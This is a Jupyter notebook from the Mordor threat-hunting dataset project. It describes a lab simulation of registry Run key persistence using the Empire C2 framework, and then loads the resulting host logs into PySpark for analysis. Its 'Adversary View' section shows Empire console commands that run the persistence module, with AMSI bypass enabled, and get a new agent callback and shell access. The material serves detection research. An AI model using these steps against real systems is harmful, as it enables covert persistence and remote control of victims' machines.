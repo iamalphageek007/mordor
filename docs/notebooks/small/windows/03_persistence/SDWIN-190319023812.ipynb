{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Userland Registry Run Keys"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/04 |\n",
    "| Tactics           | ['[TA0003](https://attack.mitre.org/tactics/TA0003)'] |\n",
    "| Techniques        | ['[T1547.001](https://attack.mitre.org/techniques/T1547/001)'] |\n",
    "| Tags              | ['Local Registry Modification', 'Registry Run Keys'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [Registry](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > \n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http            \n",
    "\n",
    "(Empire: agents) > interact KU86XWEL\n",
    "(Empire: KU86XWEL) > \n",
    "(Empire: KU86XWEL) > usemodule persistence/\n",
    "elevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver\n",
    "elevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk\n",
    "elevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry\n",
    "elevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks\n",
    "elevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*              \n",
    "(Empire: KU86XWEL) > usemodule persistence/userland/registry\n",
    "(Empire: powershell/persistence/userland/registry) > info\n",
    "\n",
    "              Name: Invoke-Registry\n",
    "            Module: powershell/persistence/userland/registry\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "  @enigma0x3\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) via the\n",
    "  HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry\n",
    "  key. This has an easy detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        KU86XWEL                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  KeyName          True        Updater                   Key name for the run trigger.           \n",
    "  RegPath          False       HKCU:Software\\Microsoft\\  Registry location to store the script   \n",
    "                              Windows\\CurrentVersion\\D  code. Last element is the key name.     \n",
    "                              ebug                    \n",
    "  ADSPath          False                                 Alternate-data-stream location to store \n",
    "                                                        the script code.                        \n",
    "  EventLogID       False                                 Store the script in the Application     \n",
    "                                                        event log under the specified EventID.  \n",
    "                                                        The ID needs to be unique/rare!         \n",
    "  ExtFile          False                                 Use an external file for the payload    \n",
    "                                                        instead of a stager.                    \n",
    "  Cleanup          False                                 Switch. Cleanup the trigger and any     \n",
    "                                                        script from specified location.         \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > set Listener http\n",
    "(Empire: powershell/persistence/userland/registry) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked KU86XWEL to run TASK_CMD_WAIT\n",
    "[*] Agent KU86XWEL tasked with task ID 1\n",
    "[*] Tasked agent KU86XWEL to run module powershell/persistence/userland/registry\n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "Registry persistence established using listener http stored in HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Debug.\n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent SP7B3U2X checked in\n",
    "[+] Initial agent SP7B3U2X from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to SP7B3U2X at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \n",
    "SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:09:04  http            \n",
    "\n",
    "(Empire: agents) > interact SP7B3U2X\n",
    "(Empire: SP7B3U2X) > shell whoami\n",
    "[*] Tasked SP7B3U2X to run TASK_SHELL\n",
    "[*] Agent SP7B3U2X tasked with task ID 1\n",
    "(Empire: SP7B3U2X) > \n",
    "theshire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "    (Empire: SP7B3U2X) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
